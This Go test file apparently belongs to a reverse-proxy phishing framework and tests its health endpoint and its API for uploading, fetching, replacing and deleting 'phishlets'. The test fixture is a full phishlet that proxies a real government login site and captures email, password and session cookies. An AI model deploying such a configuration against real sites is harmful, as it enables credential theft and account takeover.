package core

import (
	"net/http"
	"net/http/httptest"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

const testPushPhishlet = `name: 'edds'
author: 'test'
min_ver: '3.2.0'
proxy_hosts:
  - {phish_sub: 'edds.mchs', orig_sub: 'edds.mchs', domain: 'gov.ru', session: true, is_landing: true}
auth_tokens:
  - domain: 'edds.mchs.gov.ru'
    keys:
      - 'PHPSESSID:opt'
credentials:
  username:
    key: 'email'
    search: '(.*)'
    type: 'post'
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
login:
  domain: 'edds.mchs.gov.ru'
  path: '/auth/login'
`

func newPhishletTestServer(t *testing.T) (*apiServer, string) {
	t.Helper()
	a, c := newApiTestServer(t)
	dir := t.TempDir()
	c.PhishletsDir = dir
	return a, dir
}

func doPhishlet(a *apiServer, method, target, body string) *httptest.ResponseRecorder {
	var req *http.Request
	if body == "" {
		req = httptest.NewRequest(method, target, nil)
	} else {
		req = httptest.NewRequest(method, target, strings.NewReader(body))
	}
	rec := httptest.NewRecorder()
	a.handlePhishletAction(rec, req)
	return rec
}

func TestHealthzIsCheapAndOk(t *testing.T) {
	a, _ := newApiTestServer(t)
	rec := httptest.NewRecorder()
	a.handleHealth(rec, httptest.NewRequest("GET", "/healthz", nil))

	if rec.Code != http.StatusOK {
		t.Fatalf("status: %d", rec.Code)
	}
	if strings.TrimSpace(rec.Body.String()) != `{"status":"ok"}` {
		t.Fatalf("body: %s", rec.Body.String())
	}
}

func TestPhishletPushLifecycle(t *testing.T) {
	a, dir := newPhishletTestServer(t)

	rec := doPhishlet(a, "PUT", "/phishlets/demo", testPushPhishlet)
	if rec.Code != http.StatusCreated {
		t.Fatalf("create: %d body=%s", rec.Code, rec.Body.String())
	}
	path := filepath.Join(dir, "demo.yaml")
	if _, err := os.Stat(path); err != nil {
		t.Fatalf("file not written: %v", err)
	}

	rec = doPhishlet(a, "GET", "/phishlets/demo", "")
	if rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), "proxy_hosts") {
		t.Fatalf("get: %d body=%s", rec.Code, rec.Body.String())
	}
	if ct := rec.Header().Get("Content-Type"); ct != "application/x-yaml" {
		t.Fatalf("content type: %s", ct)
	}

	rec = doPhishlet(a, "PUT", "/phishlets/demo", testPushPhishlet)
	if rec.Code != http.StatusOK {
		t.Fatalf("replace: %d body=%s", rec.Code, rec.Body.String())
	}

	rec = doPhishlet(a, "DELETE", "/phishlets/demo", "")
	if rec.Code != http.StatusOK || !strings.Contains(rec.Body.String(), `"deleted"`) {
		t.Fatalf("delete: %d body=%s", rec.Code, rec.Body.String())
	}
	if _, err := os.Stat(path); !os.IsNotExist(err) {
		t.Fatalf("file still exists: %v", err)
	}

	if rec = doPhishlet(a, "GET", "/phishlets/demo", ""); rec.Code != http.StatusNotFound {
		t.Fatalf("get deleted: %d", rec.Code)
	}
	if rec = doPhishlet(a, "DELETE", "/phishlets/demo", ""); rec.Code != http.StatusNotFound {
		t.Fatalf("delete missing: %d", rec.Code)
	}
}

func TestPhishletPushKeepsPreviousVersionOnInvalidYAML(t *testing.T) {
	a, dir := newPhishletTestServer(t)
	path := filepath.Join(dir, "demo.yaml")
	if err := os.WriteFile(path, []byte(testPushPhishlet), 0600); err != nil {
		t.Fatalf("seed: %v", err)
	}

	rec := doPhishlet(a, "PUT", "/phishlets/demo", "not: [a phishlet")
	if rec.Code != http.StatusUnprocessableEntity {
		t.Fatalf("invalid status: %d body=%s", rec.Code, rec.Body.String())
	}
	b, err := os.ReadFile(path)
	if err != nil {
		t.Fatalf("read: %v", err)
	}
	if string(b) != testPushPhishlet {
		t.Fatal("previous version was lost")
	}
	if rec = doPhishlet(a, "PUT", "/phishlets/demo", "  \n"); rec.Code != http.StatusUnprocessableEntity {
		t.Fatalf("empty status: %d", rec.Code)
	}

	leftovers, err := filepath.Glob(filepath.Join(dir, ".phishlet-*"))
	if err != nil {
		t.Fatalf("glob: %v", err)
	}
	if len(leftovers) != 0 {
		t.Fatalf("temp files left: %v", leftovers)
	}
}

func TestPhishletPushRejectsBadNameAndOversize(t *testing.T) {
	a, _ := newPhishletTestServer(t)
	if rec := doPhishlet(a, "GET", "/phishlets/reload", ""); rec.Code != http.StatusBadRequest {
		t.Fatalf("reserved name: %d", rec.Code)
	}
	if rec := doPhishlet(a, "GET", "/phishlets/bad%20name", ""); rec.Code != http.StatusBadRequest {
		t.Fatalf("bad name: %d", rec.Code)
	}

	big := strings.Repeat("x", phishletYAMLMax+1)
	if rec := doPhishlet(a, "PUT", "/phishlets/demo", big); rec.Code != http.StatusRequestEntityTooLarge {
		t.Fatalf("oversize: %d body=%s", rec.Code, rec.Body.String())
	}
}
